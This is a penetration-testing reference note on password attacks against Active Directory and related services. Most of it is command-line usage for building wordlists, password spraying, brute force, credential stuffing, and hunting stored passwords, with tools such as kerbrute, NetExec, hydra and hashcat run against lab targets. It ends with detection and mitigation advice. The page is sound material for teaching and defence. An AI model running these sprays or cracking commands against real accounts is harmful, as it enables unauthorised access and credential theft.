---
tags:
  - "#type/technique"
  - "#tactic/TA0001"
  - "#tactic/TA0006"
  - "#technique/T1110"
  - "#technique/T1200"
  - "#stage/initial-access"
  - "#stage/credential-access"
  - "#os/windows"
  - "#os/linux"
  - "#tool/hashcat"
  - "#tool/john"
  - "#tool/netexec"
  - "#tool/kerbrute"
  - "#tool/domainpasswordspray"
aliases:
  - Password Attacks
  - Password Cracking
  - Password Spraying
  - Brute Force Attacks
  - Credential Stuffing
  - Password Guessing

title: Password Attacks
---

## Technique
___

Password attacks encompass various techniques used to compromise user credentials, including password spraying, brute force attacks, and credential stuffing. These attacks are often used to gain initial access to a network or to escalate privileges after obtaining a foothold.

Attackers typically target high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.

## Prerequisites
___

**Access Level:** Varies by attack type - some require network access, others require an existing foothold.

**System State:** Target systems must be accessible via network and running authentication services.

**Information:** Valid usernames, password policies, and knowledge of the target environment.

## Wordlist Generation
___

Creating effective wordlists is crucial for successful password attacks. The process involves gathering relevant words and applying transformation rules.

### Basic Wordlist Creation

```bash
# Add likely words to a file (domain name, seasons, employees, etc.)
echo "companyname" > words.txt
echo "companyname2023" >> words.txt
echo "companyname2024" >> words.txt
echo "winter" >> words.txt
echo "summer" >> words.txt
echo "welcome" >> words.txt
```

### Using Hashcat for Wordlist Generation

```bash
# Use hashcat with ruleset to generate alterations
hashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt

# Append common variations
echo "password" >> wordlist.txt
echo "Password123" >> wordlist.txt
echo "Welcome1" >> wordlist.txt

# Add exclamation point to all words
sed 's/$/!/' wordlist.txt > wordlist_with_exclamation.txt
cat wordlist.txt wordlist_with_exclamation.txt | sort -u > final_wordlist.txt
```

### Custom Wordlist Generation

```bash
# Create company-specific wordlist
echo -e "companyname\nCompanyname\nCOMPANYNAME\ncompany\nCompany\nCOMPANY" > company_words.txt

# Add seasonal variations
echo -e "spring\nsummer\nautumn\nwinter\nSpring2023\nSummer2023\nFall2023\nWinter2023" >> company_words.txt

# Add common patterns
echo -e "Welcome1\nPassword123\nchangeme\nPassword1\nP@ssw0rd" >> company_words.txt

# Generate combinations
for company in $(cat company_names.txt); do
    for season in $(cat seasons.txt); do
        echo "${company}${season}" >> wordlist.txt
        echo "${company}_${season}" >> wordlist.txt
        echo "${company}-${season}" >> wordlist.txt
    done
done
```

## Password Spraying
___

Password spraying involves testing a small number of common passwords against a large number of accounts. This technique avoids account lockouts by limiting the number of attempts per account.

### From Linux

#### Using rpcclient

```bash
# Test single password against multiple users
for u in $(cat valid_users.txt);do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; 
done
```

#### Using Kerbrute

```bash
# Spray password against domain users
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Spray with custom user agent
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 --user-agent "Mozilla/5.0"
```

#### Using NetExec

```bash
# Spray password against multiple hosts
nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Test single user against multiple hosts
nxc smb 172.16.5.5 -u avazquez -p Password123

# Spray with delay between attempts
nxc smb 172.16.5.0/24 -u valid_users.txt -p Password123 --delay 30
```

#### Spray Local Admin Hash Around Domain

```bash
# Test local admin hash against multiple machines
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

> **Note**: The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

### From Windows

#### Using DomainPasswordSpray

[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) is a PowerShell tool for password spraying in Active Directory environments.

```powershell
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Spray with custom user list
Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Spray multiple passwords
Invoke-DomainPasswordSpray -PasswordList passwords.txt -OutFile spray_success -ErrorAction SilentlyContinue

# Spray against specific domain controller
Invoke-DomainPasswordSpray -Password Welcome1 -DomainController dc01.domain.local -OutFile spray_success
```

## External Password Spraying
___

External password spraying targets internet-facing services that use Active Directory authentication.

### Common Targets

- Microsoft 365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

### O365 Password Spraying

```bash
# Using MSFconsole
msfconsole
use auxiliary/scanner/http/ms_office365_sprayer
set RHOSTS login.microsoftonline.com
set USERFILE users.txt
set PASSWORD Welcome1
run

# Using o365spray (Python tool)
python3 o365spray.py -u users.txt -p Password123
```

### RDP Password Spraying

```bash
# Using crowbar
crowbar -b rdp -s 192.168.1.0/24 -u users.txt -C passwords.txt

# Using hydra
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

## Workarounds for Common Issues
___

### "Password must be changed on next logon" (Password_must_change)

When encountering accounts that require password change on next logon, there are two potential workarounds:

#### Using rpcclient

```bash
rpcclient -U <user> <IP>
rpcclient $> setuserinfo2 <user> 23 'Password123!'
```

#### Using smbpasswd

```bash
smbpasswd -U <user> -r <IP>
```

### Password in Description Field

Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

#### Remote Enumeration

```bash
# Using NetExec
nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users

# Using ldapsearch
ldapsearch -x -H ldap://<IP> -D "<user>@<domain>" -w "<password>" -b "DC=domain,DC=local" "(objectClass=user)" description sAMAccountName
```

#### Local Enumeration

```powershell
# Using PowerView
Import-Module powerview.ps1
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

# Export to CSV for offline analysis
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null} | Export-Csv -NoTypeInformation user_descriptions.csv
```

### Passwords in Files

Search for passwords stored in configuration files, scripts, and documentation.

#### Windows

```cmd
# Search for password in common file types
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Search for specific patterns
findstr /SIM /C:"password=" *.config *.xml
findstr /SIM /C:"pwd" *.ps1 *.bat
```

#### Linux

```bash
# Search for password in common file types
grep -r -i "password" /etc/ 2>/dev/null
grep -r -i "pwd" /home/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

## Brute Force Attacks
___

Brute force attacks involve trying many possible passwords against one or more accounts.

### Online Brute Force

```bash
# Using Hydra against SSH
hydra -l admin -P passwords.txt ssh://192.168.1.10

# Using Medusa against RDP
medusa -h 192.168.1.10 -u admin -P passwords.txt -M rdp

# Using NetExec against SMB
nxc smb 192.168.1.10 -u admin -P passwords.txt --continue-on-success
```

### Offline Brute Force

```bash
# Using Hashcat against NTLM hashes
hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt

# Using John the Ripper
john --format=NT --wordlist=wordlist.txt ntlm_hashes.txt

# Using Hashcat with rules
hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

## Credential Stuffing
___

Credential stuffing involves using previously breached username/password pairs against different services.

```bash
# Using NetExec with credential pairs
nxc smb 192.168.1.0/24 -u credentials.txt -p credentials.txt --continue-on-success

# Using credential stuffing with Burp Suite
# Load credentials list and configure Intruder to test against login forms
```

## Detection & Mitigation
___

### Detection

- Monitor for multiple failed login attempts from the same source
- Watch for authentication attempts against multiple accounts with the same password
- Track unusual login patterns (time of day, source IP)
- Monitor for password spraying tools and techniques
- Analyze authentication logs for patterns consistent with attacks

### Mitigation

- Implement strong password policies
- Use multi-factor authentication (MFA)
- Implement account lockout policies
- Deploy anomaly detection for authentication
- Use password filtering solutions
- Implement just-in-time (JIT) access
- Regularly educate users on password security
- Monitor for credential exposure in code repositories and documentation